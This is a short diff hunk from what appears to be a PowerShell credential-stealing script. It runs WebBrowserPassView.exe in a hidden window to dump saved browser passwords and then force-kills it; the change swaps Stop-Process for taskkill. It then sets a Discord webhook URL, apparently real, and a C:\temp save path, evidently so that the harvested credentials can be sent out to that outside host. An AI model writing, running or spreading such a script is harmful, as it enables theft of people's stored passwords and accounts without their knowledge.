@@ -11,7 +11,7 @@ Start-Sleep -Seconds 5
 Start-Process -FilePath .\WebBrowserPassView.exe -Wait -WindowStyle Hidden
 
 Start-Sleep -Seconds 30
-Stop-Process -Name WebBrowserPassView
+taskkill /IM WebBrowserPassView.exe /F 
 $hookurl='https://discord.com/api/webhooks/1180337343920615434/dPohBhRKx_M_MeRIEQQjdOsPTydHKpwg_Vt6nOJU2ZeREXnDfQXV08laAiP2I45nQLBj'
 $fileSaveDir = 'C:\temp'
 $date = get-date
